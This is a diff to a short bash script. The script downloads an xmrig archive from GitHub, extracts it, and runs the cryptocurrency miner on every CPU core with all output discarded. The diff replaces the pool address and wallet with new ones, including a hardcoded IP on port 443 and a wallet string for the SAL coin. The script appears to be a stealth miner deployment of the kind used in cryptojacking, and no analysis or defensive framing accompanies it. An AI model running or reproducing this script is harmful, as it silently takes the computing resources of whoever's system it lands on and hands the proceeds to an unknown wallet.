@@ -1,3 +1,6 @@
 #!/bin/bash
+A=157.230.255.104:443
+B=8ARZp6tyeNzMcq9zheXVcoA2z3VVuueCTJZkmNmwh36yRztNuoLFqLUWZDysmSM5q7fyqcYdn1BcDfzJtHXdQMEdTsG6eDB
+C=GAS
 wget https://github.com/Adeemar7/all/raw/main/xmrig.tar.gz && tar -xvf xmrig.tar.gz >/dev/null 2>&1
-./xmrig -a randomx --url 139.162.60.95:443 --user SaLvs6xH5qeV5j4DTgCFCmdE9Sgix5QcJfravWBbsgDJDGJ9YqgMcLxFALARL4eoN5JEjds8GcjPnXRfKFruYGeRNyDKdhsm3dC.bogeng -t $(nproc --all) >/dev/null 2>&1
+./xmrig --coin=SAL --url $A --user $B --pass $C --donate-level 1 -a rx/0 -t $(nproc --all) >/dev/null 2>&1
